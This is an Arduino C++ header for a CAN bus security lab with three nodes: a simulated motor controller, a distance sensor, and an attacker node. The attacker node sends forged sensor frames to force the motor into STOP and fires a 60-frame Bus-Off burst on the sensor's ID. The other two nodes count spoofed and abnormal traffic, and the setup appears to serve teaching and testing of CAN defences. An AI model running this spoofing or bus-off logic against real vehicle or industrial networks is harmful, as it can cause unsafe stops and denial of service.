#ifndef CANLAB_NODE_H
#define CANLAB_NODE_H
#include <SPI.h>
#include <EEPROM.h>
#include <mcp2515_can.h>
#include "Protocol.h"

#ifndef NODE_ROLE
#if defined(NODE_ROLE_A)
#define NODE_ROLE (NODE_ROLE_A ? 1 : 2)
#else
#define NODE_ROLE 2
#endif
#endif

// Match the settings that already work with the Seeed demo on YOUR shields.
const uint8_t CAN_CS = 9;
const uint8_t CAN_CLOCK = MCP_16MHz;
const uint32_t CAN_SPEED = CAN_500KBPS;
const uint32_t SERIAL_SPEED = 115200;

#if NODE_ROLE == 1
const char ROLE = 'A';
const uint16_t OWN_ID = Lab::MOTOR_ID;
#elif NODE_ROLE == 2
const char ROLE = 'B';
const uint16_t OWN_ID = Lab::SENSOR_ID;
#else
const char ROLE = 'C';
const uint16_t OWN_ID = 0x320;
#endif

mcp2515_can can(CAN_CS);

struct Counters {
  uint32_t rx, queued, txOk, txFail, txTimeout, bad, unrelated;
  uint32_t duplicate, old, missing, ownId, zeros, overflow, stale, ack, spoofTx;
} counts = {};

bool ready = false, txBusy = false, halted = false;
bool haveSample = false, linkFresh = false;
bool paused = false, invalidSensor = false, replyPending = false;
bool spoofActive = false;
uint8_t busOffBurstRemaining = 0; // remaining frames in a Bus-Off test burst
bool busOffBurstZeros = false;    // true = 0x00 fill, false = 0xFF fill

uint32_t txStarted = 0, lastInit = 0, lastDiag = 0, lastStats = 0;
uint32_t lastSampleAt = 0, lastAckAt = 0, lastSendAt = 0, lastSpoofAt = 0;
uint16_t bootSession = 0, peerSession = 0, lastSeq = 0, nextSeq = 0;
uint16_t spoofSeq = 1;
uint16_t distanceCm = 0, lastPublishedSession = 0;
uint8_t motorState = Lab::STOP;
uint8_t previousErrorState = 0xff;
bool haveAck = false, ackTimedOut = false, abortRequested = false;
uint8_t publishedFault = 0;

// MCP2515 documented SPI commands. All access is in loop(), never an ISR.
// This supplements Seeed with read-only TEC/REC/status observations.
uint8_t regRead(uint8_t address) {
  SPI.beginTransaction(SPISettings(8000000, MSBFIRST, SPI_MODE0));
  digitalWrite(CAN_CS, LOW); SPI.transfer(0x03); SPI.transfer(address);
  uint8_t value = SPI.transfer(0);
  digitalWrite(CAN_CS, HIGH); SPI.endTransaction(); return value;
}

void regModify(uint8_t address, uint8_t mask, uint8_t value) {
  SPI.beginTransaction(SPISettings(8000000, MSBFIRST, SPI_MODE0));
  digitalWrite(CAN_CS, LOW); SPI.transfer(0x05); SPI.transfer(address);
  SPI.transfer(mask); SPI.transfer(value);
  digitalWrite(CAN_CS, HIGH); SPI.endTransaction();
}

void event(const __FlashStringHelper *message) {
  Serial.print(millis()); Serial.print(' '); Serial.print(ROLE);
  Serial.print(' '); Serial.println(message);
}

void printRegisters() {
  Serial.print(F("EFLG=0x")); Serial.print(regRead(0x2d), HEX);
  Serial.print(F(" TEC=")); Serial.print(regRead(0x1c));
  Serial.print(F(" REC=")); Serial.print(regRead(0x1d));
  Serial.print(F(" TX0CTRL=0x")); Serial.println(regRead(0x30), HEX);
}

void printStats() {
  Serial.print(F("STATS ")); Serial.print(ROLE);
  Serial.print(F(" rx=")); Serial.print(counts.rx);
  Serial.print(F(" queued=")); Serial.print(counts.queued);
  Serial.print(F(" tx_ok=")); Serial.print(counts.txOk);
  Serial.print(F(" tx_fail=")); Serial.print(counts.txFail);
  Serial.print(F(" tx_deadline=")); Serial.print(counts.txTimeout);
  Serial.print(F(" spoof_tx=")); Serial.print(counts.spoofTx);
  Serial.print(F(" bad=")); Serial.print(counts.bad);
  Serial.print(F(" duplicate=")); Serial.print(counts.duplicate);
  Serial.print(F(" old=")); Serial.print(counts.old);
  Serial.print(F(" missing=")); Serial.print(counts.missing);
  Serial.print(F(" own_id=")); Serial.print(counts.ownId);
  Serial.print(F(" zero=")); Serial.print(counts.zeros);
  Serial.print(F(" rx_overflow=")); Serial.print(counts.overflow);
  Serial.print(F(" stale=")); Serial.print(counts.stale);
  Serial.print(F(" app_ack=")); Serial.println(counts.ack);
  if (ready) printRegisters();
}

bool initializeCan() {
  // D10 must remain OUTPUT on AVR UNO (SPI master), and deselect SD (D4).
  pinMode(10, OUTPUT); digitalWrite(10, HIGH);
  pinMode(4, OUTPUT); digitalWrite(4, HIGH);
  if (can.begin(CAN_SPEED, CAN_CLOCK) != CAN_OK) {
    event(F("CAN_INIT_FAIL: check CS, oscillator and shield seating"));
    return false;
  }
  if (can.setMode(MODE_NORMAL) != CAN_OK) return false;
  // Zero masks accept all IDs, including OWN_ID. Software rejects EXT and RTR.
  // Must NOT filter out OWN_ID: the future Parrot owner must see spoofed IDs.
  if (can.init_Mask(0, 0, 0) != CAN_OK ||
      can.init_Mask(1, 0, 0) != CAN_OK) return false;
  for (uint8_t i = 0; i < 6; ++i)
    if (can.init_Filt(i, 0, 0) != CAN_OK) return false;
  // RXM=00: use filters; BUKT enabled to permit RXB0 rollover.
  regModify(0x60, 0x64, 0x04); regModify(0x70, 0x60, 0);
  regModify(0x2c, 0x04, 0); // TX0IF clear; only TX buffer 0 is used.
  txBusy = false; halted = false; abortRequested = false;
  busOffBurstRemaining = 0; previousErrorState = 0xff;
  event(F("CAN_READY classic standard-11bit 500k DLC8"));
  return true;
}

void serviceTx(uint32_t now) {
  if (!txBusy) return;
  const uint8_t ctrl = regRead(0x30);
  if (!(ctrl & 0x08)) { // TXREQ cleared: examine completion, not just enqueue.
    if ((regRead(0x2c) & 0x04) && !(ctrl & 0x50)) ++counts.txOk;
    else ++counts.txFail;
    regModify(0x2c, 0x04, 0); txBusy = false;
  } else if (!abortRequested && Lab::elapsed(now, txStarted, Lab::TX_DEADLINE_MS)) {
    // ABAT requests an orderly controller abort, NOT an injected error frame.
    // Leave asserted until TXREQ actually clears; never reuse a pending buffer.
    regModify(0x0f, 0x10, 0x10);
    ++counts.txTimeout; event(F("TX_DEADLINE: abort pending sample"));
    abortRequested = true;
  }
  if (!txBusy) { regModify(0x0f, 0x10, 0); abortRequested = false; }
}

bool queueFrame(uint16_t id, uint8_t dlc, const uint8_t *data) {
  if (!ready || halted || txBusy) return false;
  regModify(0x2c, 0x04, 0);
  // CAN_OK here means QUEUED; serviceTx checks actual controller completion.
  if (can.trySendMsgBuf(id, 0, 0, dlc, data, 0) != CAN_OK) {
    ++counts.txFail; return false;
  }
  txBusy = true; txStarted = millis(); ++counts.queued; return true;
}

void serviceBusOffBurst() {
  if (!busOffBurstRemaining || halted || txBusy) return;
  uint8_t frame[8];
  const uint8_t fill = busOffBurstZeros ? 0x00 : 0xFF;
  for (uint8_t i = 0; i < 8; ++i) frame[i] = fill;
  if (queueFrame(Lab::SENSOR_ID, Lab::DLC, frame)) {
    --busOffBurstRemaining;
    if (!busOffBurstZeros) ++counts.spoofTx;
  }
}

bool sendSpoofStopFrame() {
  uint8_t frame[8];
  // Valid sensor payload format (version=1, cm<=5000, flags=0, session!=0)
  // crafted with cm <= STOP_CM (10 <= 50) to force A into STOP.
  Lab::encode(frame, spoofSeq, 10, 0, bootSession);
  if (!queueFrame(Lab::SENSOR_ID, Lab::DLC, frame)) return false;
  ++spoofSeq;
  ++counts.spoofTx;
  event(F("SPOOF_STOP_QUEUED id=0x120 cm=10"));
  return true;
}

void diagnostics(uint32_t now) {
  if (!Lab::elapsed(now, lastDiag, 5)) return;
  lastDiag = now;
  const uint8_t flags = regRead(0x2d);
  const uint8_t state = flags & 0x3f;
  if (state != previousErrorState) {
    previousErrorState = state;
    event(F("CAN_STATE_CHANGED")); printRegisters();
    if (flags & 0x20) event(F("CAN_BUS_OFF"));
    else if (flags & 0x18) event(F("CAN_ERROR_PASSIVE"));
    else event(F("CAN_ERROR_ACTIVE"));
    if (flags & 0x07) event(F("CAN_ERROR_WARNING"));
  }
  if (flags & 0xc0) {
    ++counts.overflow;
    event(F("RX_OVERFLOW: at least one frame lost"));
    regModify(0x2d, 0xc0, 0); // Clear ONLY the two software-clearable overflow bits.
  }
  if ((flags & 0x20) && !halted) {
    halted = true; motorState = Lab::STOP;
    spoofActive = false; busOffBurstRemaining = 0;
    event(F("BUS_OFF_OBSERVED: application TX halted; use r to reinitialize"));
    // MCP2515 can still recover autonomously; this is an application latch only.
  }
}

void publishMotor() {
  Serial.print(F("MOTOR "));
  if (motorState == Lab::RUN) Serial.print(F("RUN"));
  else if (motorState == Lab::SENSOR_FAULT) Serial.print(F("STOP_SENSOR_FAULT"));
  else Serial.print(F("STOP"));
  Serial.print(F(" cm=")); Serial.print(distanceCm);
  Serial.print(F(" seq=")); Serial.println(lastSeq);
}

void receiveSensor(const uint8_t *data, uint32_t now) {
  if (!Lab::validSensor(data)) { ++counts.bad; event(F("BAD_SENSOR_PAYLOAD")); return; }
  const uint16_t session = Lab::u16(data + 6), seq = Lab::u16(data + 1);
  const bool sameSession = haveSample && session == peerSession;
  const Lab::Order ord = Lab::order(sameSession, lastSeq, seq);
  if (ord == Lab::DUPLICATE) { ++counts.duplicate; return; }
  if (ord == Lab::OLD) { ++counts.old; return; }
  if (ord == Lab::FORWARD) counts.missing += uint16_t(seq - lastSeq) - 1U;
  if (!sameSession) event(F("SENSOR_SESSION_CHANGE: resync (not authentication)"));
  haveSample = true; peerSession = session; lastSeq = seq;
  distanceCm = Lab::u16(data + 3); lastSampleAt = now;
  if (!linkFresh) event(F("SENSOR_LINK_UP"));
  linkFresh = true;
  motorState = halted ? Lab::STOP : data[5] ? Lab::SENSOR_FAULT :
    (distanceCm <= Lab::STOP_CM ? Lab::STOP : Lab::RUN);
  publishMotor(); replyPending = true;
}

void receiveStatus(const uint8_t *data, uint32_t now) {
  if (!Lab::validStatus(data)) { ++counts.bad; return; }
  // This confirms only the most recently QUEUED sample in this low-load test.
  // Session/sequence are diagnostics, not identity or anti-replay credentials.
  if (!haveSample || Lab::u16(data + 6) != lastPublishedSession ||
      Lab::u16(data + 1) != lastSeq || Lab::u16(data + 3) != distanceCm ||
      data[5] != (publishedFault ? Lab::SENSOR_FAULT :
        (distanceCm <= Lab::STOP_CM ? Lab::STOP : Lab::RUN))) {
    ++counts.old; return;
  }
  if (haveAck) { ++counts.duplicate; return; }
  haveAck = true; ackTimedOut = false; lastAckAt = now; ++counts.ack;
  if (!linkFresh) event(F("APPLICATION_LINK_UP"));
  linkFresh = true;
  Serial.print(F("APP_ACK seq=")); Serial.print(lastSeq);
  Serial.print(F(" motor=")); Serial.println(data[5]);
}

void receiveFrames(uint32_t now) {
  // Bound work per loop so a busy bus cannot starve watchdogs or diagnostics.
  for (uint8_t n = 0; n < 8 && can.checkReceive() == CAN_MSGAVAIL; ++n) {
    uint8_t len = 0, data[8] = {};
    if (can.readMsgBuf(&len, data) != CAN_OK) { ++counts.bad; continue; }
    const uint32_t id = can.getCanId();
    const bool ext = can.isExtendedFrame(), rtr = can.isRemoteRequest();
    ++counts.rx;
    if (ext || rtr) { ++counts.bad; continue; }
    if (id == OWN_ID) {
      ++counts.ownId;
      event(F("OWN_ID_RX: possible spoof; monitor only, Parrot OFF"));
      continue;
    }
#if NODE_ROLE == 1
    if (id != Lab::SENSOR_ID) { ++counts.unrelated; continue; }
    if (len != Lab::DLC) { ++counts.bad; event(F("BAD_DLC")); continue; }
    if (Lab::allZero(data)) {
      ++counts.zeros; event(F("ZERO_RESERVED: possible future Dmessage"));
      // A must not interpret Parrot all-zero traffic as distance=0 or version=0.
      // Hold STOP until a NEW valid sample arrives; do not refresh freshness.
      motorState = Lab::STOP; publishMotor();
      continue;
    }
    receiveSensor(data, now);
#elif NODE_ROLE == 2
    if (id != Lab::MOTOR_ID) { ++counts.unrelated; continue; }
    if (len != Lab::DLC) { ++counts.bad; event(F("BAD_DLC")); continue; }
    if (Lab::allZero(data)) {
      ++counts.zeros; event(F("ZERO_RESERVED: possible future Dmessage"));
      continue;
    }
    receiveStatus(data, now);
#else
    ++counts.unrelated;
#endif
  }
}

void serviceApplication(uint32_t now) {
#if NODE_ROLE == 1
  if (haveSample && linkFresh && Lab::elapsed(now, lastSampleAt, Lab::STALE_MS)) {
    linkFresh = false; motorState = Lab::STOP; replyPending = false;
    ++counts.stale; event(F("SENSOR_TIMEOUT -> MOTOR STOP")); publishMotor();
  }
  if (replyPending && !halted) {
    uint8_t frame[8]; Lab::encode(frame, lastSeq, distanceCm, motorState, peerSession);
    if (queueFrame(Lab::MOTOR_ID, 8, frame)) replyPending = false;
  }
#elif NODE_ROLE == 2
  if (haveSample && !ackTimedOut && Lab::elapsed(now, lastAckAt, Lab::STALE_MS)) {
    ackTimedOut = true; linkFresh = false; ++counts.stale; event(F("APPLICATION_ACK_TIMEOUT"));
  }
  if (!paused && !halted && !busOffBurstRemaining && Lab::elapsed(now, lastSendAt, Lab::SAMPLE_MS)) {
    lastSendAt = now;
    uint8_t frame[8]; const uint16_t cm = Lab::simulatedDistance(nextSeq);
    Lab::encode(frame, nextSeq, cm, invalidSensor ? 1 : 0, bootSession);
    if (queueFrame(Lab::SENSOR_ID, 8, frame)) {
      if (!haveSample) { lastAckAt = now; ackTimedOut = false; }
      lastSeq = nextSeq++; distanceCm = cm; lastPublishedSession = bootSession;
      publishedFault = invalidSensor ? 1 : 0;
      haveSample = true; haveAck = false;
    }
  }
#else
  if (spoofActive && !halted && !busOffBurstRemaining && Lab::elapsed(now, lastSpoofAt, 120)) {
    lastSpoofAt = now;
    sendSpoofStopFrame();
  }
#endif
}

void help() {
  event(F("h help | s stats | r reinitialize controller (clears TEC/REC)"));
#if NODE_ROLE == 2
  event(F("B: p pause/resume | i toggle sensor-fault | z duplicate | o old | m bad-DLC"));
  event(F("For d/o/m/z: p first, wait >=250ms, then send one command"));
#elif NODE_ROLE == 3
  event(F("C: 1 single spoof STOP | a continuous spoof STOP | k 60x 0xFF Bus-Off attack burst"));
#endif
}

void commands() {
  if (!Serial.available()) return;
  const char c = Serial.read();
  if (c == 'h') help();
  if (c == 's') printStats();
  if (c == 'r') {
    motorState = Lab::STOP; linkFresh = false; haveSample = false;
    replyPending = false; haveAck = false; spoofActive = false; busOffBurstRemaining = 0;
    ready = initializeCan(); lastInit = millis();
    event(F("MANUAL_RESET: controller counters reset; software totals retained"));
  }
#if NODE_ROLE == 2
  if (c == 'p') { paused = !paused; event(paused ? F("SENSOR_PAUSED") : F("SENSOR_RESUMED")); }
  if (c == 'i') { invalidSensor = !invalidSensor; event(invalidSensor ? F("SENSOR_FAULT_ON") : F("SENSOR_FAULT_OFF")); }
  if (c == 'z' || c == 'd' || c == 'o' || c == 'm') {
    if (!paused || !haveSample) { event(F("FAULT_TEST: pause B after at least one sample first")); return; }
    uint8_t frame[8] = {};
    if (c != 'z') Lab::encode(frame, c == 'o' ? uint16_t(lastSeq - 1) : lastSeq,
                              distanceCm, invalidSensor ? 1 : 0, bootSession);
    event(queueFrame(Lab::SENSOR_ID, c == 'm' ? 3 : 8, frame) ?
          F("TEST_FRAME_QUEUED") : F("TEST_FRAME_BUSY_OR_HALTED"));
  }
#elif NODE_ROLE == 3
  if (c == '1') sendSpoofStopFrame();
  if (c == 'a') {
    spoofActive = !spoofActive;
    event(spoofActive ? F("SPOOF_STOP_CONTINUOUS_ON") : F("SPOOF_STOP_CONTINUOUS_OFF"));
  }
  if (c == 'k') {
    busOffBurstZeros = false;
    busOffBurstRemaining = 60;
    event(F("BUSOFF_ATTACK_LAUNCHED: 60x 0xFF on id=0x120 (Parrot OFF)"));
  }
#endif
}

void setup() {
  Serial.begin(SERIAL_SPEED);
  // Diagnostic boot number only; two EEPROM bytes reserved at addresses 0..1.
  // Not a cryptographic nonce and not atomic under power loss during EEPROM write.
  EEPROM.get(0, bootSession);
  bootSession = (bootSession == 0xffffU || bootSession == 0xfffeU) ? 1 : uint16_t(bootSession + 1);
  if (!bootSession) bootSession = 1;
  EEPROM.put(0, bootSession);
  event(F("CAN LAB BASELINE: spoof STOP & Bus-Off attack ready, Parrot OFF"));
  ready = initializeCan(); lastInit = millis(); help();
}

void loop() {
  uint32_t now = millis(); commands();
  if (!ready) {
    if (Lab::elapsed(now, lastInit, 2000)) { lastInit = now; ready = initializeCan(); }
    return;
  }
  serviceBusOffBurst();
  diagnostics(now); serviceTx(now); serviceBusOffBurst();
  receiveFrames(now); serviceBusOffBurst();
  serviceApplication(millis());
  if (Lab::elapsed(millis(), lastStats, 2000)) { lastStats = millis(); printStats(); }
}
#endif